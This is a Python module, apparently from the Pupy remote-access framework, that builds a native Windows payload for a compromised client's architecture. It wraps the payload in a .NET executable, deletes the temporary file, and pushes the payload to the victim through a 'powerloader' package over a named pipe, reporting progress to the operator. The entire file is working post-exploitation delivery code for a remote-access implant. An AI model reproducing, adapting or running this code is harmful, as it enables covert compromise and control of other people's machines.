# -*- encoding: utf-8 -*-

from os import unlink
from threading import Event

from pupygen import generate_binary_from_template
from pupylib.payloads.dotnet import DotNetPayload

DEFAULT_TIMEOUT = 90

def serve(module, payload_config, timeout=DEFAULT_TIMEOUT):
    # Use native arch

    os_arch = module.client.arch

    payload, tpl, _ = generate_binary_from_template(
        module.log, payload_config, 'windows', arch=os_arch, shared=True
    )

    module.success(
        "Generating native payload with the current config from {} - size={}".format(
            tpl, len(payload)))

    dotnet_payload_path = DotNetPayload(
        module.log, module.client.pupsrv, payload_config, payload).gen_exe()

    dotnet_payload = None

    with open(dotnet_payload_path, 'rb') as dotnet_payload_obj:
        dotnet_payload = dotnet_payload_obj.read()

    unlink(dotnet_payload_path)

    module.success("Wrapped .NET payload - size={}".format(len(dotnet_payload)))

    module.client.load_package('powerloader')
    push_payload = module.client.remote('powerloader', 'push_payload', False)

    completion = Event()

    def _power_logger(result, info):
        if result is None:
            module.info('PowerLoader: '+info)
            return

        if result is False:
            module.error('PowerLoader: '+info)
        elif result is True:
            module.success('PowerLoader: '+info)

        if completion:
            completion.set()

    cmd, pipename = push_payload(
        dotnet_payload, timeout=timeout, log_cb=_power_logger)

    module.success("PowerLoader: Serving payload to pipe={} for {} seconds".format(
        pipename, timeout))

    return cmd, completion
